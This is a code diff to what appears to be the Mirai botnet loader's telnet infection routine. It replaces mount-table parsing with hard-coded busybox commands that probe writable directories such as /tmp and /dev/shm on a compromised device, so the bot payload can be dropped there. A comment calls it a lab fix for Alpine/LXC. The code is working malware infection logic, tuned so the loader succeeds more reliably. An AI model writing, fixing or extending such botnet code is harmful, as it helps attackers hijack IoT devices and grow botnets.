@@ -350,62 +350,33 @@ int connection_consume_psoutput(struct connection *conn)
 
 int connection_consume_mounts(struct connection *conn)
 {
-    char linebuf[256];
-    int linebuf_pos = 0, num_whitespaces = 0;
-    int i, prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));
+    int prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));
 
     if (prompt_ending == -1)
         return 0;
 
-    for (i = 0; i < prompt_ending; i++)
-    {
-
-        if (linebuf_pos == sizeof(linebuf) - 1)
-        {
-            // why are we here
-            break;
-        }
-
-        if (conn->rdbuf[i] == '\n')
-        {
-            char *path, *mnt_info;
-
-            linebuf[linebuf_pos++] = 0;
-
-            strtok(linebuf, " "); // Skip name of partition
-            if ((path = strtok(NULL, " ")) == NULL)
-                goto dirs_end_line;
-            if (strtok(NULL, " ") == NULL) // Skip type of partition
-                goto dirs_end_line;
-            if ((mnt_info = strtok(NULL, " ")) == NULL)
-                goto dirs_end_line;
-
-            if (path[strlen(path) - 1] == '/')
-                path[strlen(path) - 1] = 0;
-
-            if (util_memsearch(mnt_info, strlen(mnt_info), "rw", 2) != -1)
-            {
-                util_sockprintf(conn->fd, "/bin/busybox echo -e '%s%s' > %s/.nippon; /bin/busybox cat %s/.nippon; /bin/busybox rm %s/.nippon\r\n",
-                                VERIFY_STRING_HEX, path, path, path, path, path);
-            }
-
-            dirs_end_line:
-            linebuf_pos = 0;
-        }
-        else if (conn->rdbuf[i] == ' ' || conn->rdbuf[i] == '\t')
-        {
-            if (num_whitespaces++ == 0)
-                linebuf[linebuf_pos++] = conn->rdbuf[i];
-        }
-        else if (conn->rdbuf[i] != '\r')
-        {
-            num_whitespaces = 0;
-            linebuf[linebuf_pos++] = conn->rdbuf[i];
-        }
-    }
-
-    util_sockprintf(conn->fd, "/bin/busybox echo -e '%s/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon\r\n",
-                                VERIFY_STRING_HEX);
+    /*
+     * Lab fix (Alpine/LXC): full /proc/mounts probing floods telnet with
+     * dozens of /proc /sys /dev paths and times out at TELNET_READ_WRITEABLE
+     * (state 10) before ECCHI returns. Only probe a few known-good dirs.
+     * connection_consume_written_dirs keeps the FIRST successful path.
+     */
+    util_sockprintf(conn->fd,
+        "/bin/busybox echo -e '%s/run' > /run/.nippon; /bin/busybox cat /run/.nippon; /bin/busybox rm /run/.nippon\r\n",
+        VERIFY_STRING_HEX);
+    util_sockprintf(conn->fd,
+        "/bin/busybox echo -e '%s/tmp' > /tmp/.nippon; /bin/busybox cat /tmp/.nippon; /bin/busybox rm /tmp/.nippon\r\n",
+        VERIFY_STRING_HEX);
+    util_sockprintf(conn->fd,
+        "/bin/busybox echo -e '%s/var/tmp' > /var/tmp/.nippon; /bin/busybox cat /var/tmp/.nippon; /bin/busybox rm /var/tmp/.nippon\r\n",
+        VERIFY_STRING_HEX);
+    util_sockprintf(conn->fd,
+        "/bin/busybox echo -e '%s/dev/shm' > /dev/shm/.nippon; /bin/busybox cat /dev/shm/.nippon; /bin/busybox rm /dev/shm/.nippon\r\n",
+        VERIFY_STRING_HEX);
+    /* Rootfs fallback (not /dev — often noexec on LXC). */
+    util_sockprintf(conn->fd,
+        "/bin/busybox echo -e '%s/' > /.nippon; /bin/busybox cat /.nippon; /bin/busybox rm /.nippon\r\n",
+        VERIFY_STRING_HEX);
 
     util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
     return prompt_ending;
